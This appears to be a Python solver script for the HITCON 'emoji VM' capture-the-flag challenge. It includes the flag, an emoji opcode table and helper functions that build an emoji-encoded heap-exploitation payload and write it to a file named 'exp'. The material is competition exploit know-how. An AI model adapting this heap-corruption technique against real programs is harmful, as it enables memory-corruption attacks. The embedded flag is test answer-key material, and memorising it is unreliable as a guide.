#!/usr/bin/env python3
#from pwn import *
import re

# hitcon{H0p3_y0u_Enj0y_pWn1ng_th1S_3m0j1_vM_^_^b}

'''
1  🈳: nop
2  ➕: +
3  ➖: -
4  ❌: *
5  ❓: %
6  ❎: ^
7  👫: &
8  💀: <
9  💯: ==
10 🚀: jmp
11 🈶: jmp if true
12 🈚: jmp if false
13 ⏬: push back
14 🔝: pop top
15 📤: load?
16 📥: store?
17 🆕: malloc (at most 10) [size, malloc(size)]
18 🆓: free
19 📄: read
20 📝: write
21 🔡: write until nullbyte
22 🔢: cout
23 🛑: exit
'''

'''
store [i] [j] [top]
load  top = mem[i][j]
'''

num = [ '😀' , '😁', '😂' , '🤣' , '😜' , '😄' , '😅' , '😆' , '😉' , '😊' , '😍' ]

def push( n ):
    if n <= 10:
        return '⏬' + num[n]
    else:
        return  mul( n // 10 , 10 ) + add( n % 10 , -1 )

def add( a , b , top = False ):
    if b < 0:
        return push( a ) + '➕'
    else:
        return push( b ) + push( a ) + '➕'

def sub( a , b ):
    if b == -1:
        return push( b ) + push( a ) + '➖'
    return push( b ) + push( a ) + '➖'

def mul( a , b ):
    if b == -1:
        return push( a ) + '❌'
    return push( b ) + push( a ) + '❌'

def store( i , j , v ):
    if v == -1:
        return push(j) + push(i) + '📥'
    if type(v) == type('y'):
        v = ord( v )
    return push(v) + push(j) + push(i) + '📥'

def load( i , j ):
    return push(j) + push(i) + '📤'

now = '\0' * 10

def store_str( i , s ):
    p = ''
    for j in range( len( s ) ):
        if now[j] == s[j]:
            continue
        p += store( i , j , s[j] )
    return p

def read( i ):
    return push( i ) + '📄'

def wri( i ):
    return push( i ) + '📝'

pop = '🔝'
wri_stk = '🔡'
puti = '🔢'

p = ''
p += ( push( 10 ) + '🆕' ) * 6
p += '➕'
p += pop * 9
p += add( 10 , -1 ) * 15 # 3 control 1
p += add( 2 , -1 )
p += pop * 20
p += puti
p += read( 3 )
p += read( 1 )
p += push( 10 ) + '🆕'
p += '🛑'

print( len( p ) )

o = open( 'exp' , 'w+' )
o.write( p )
o.close()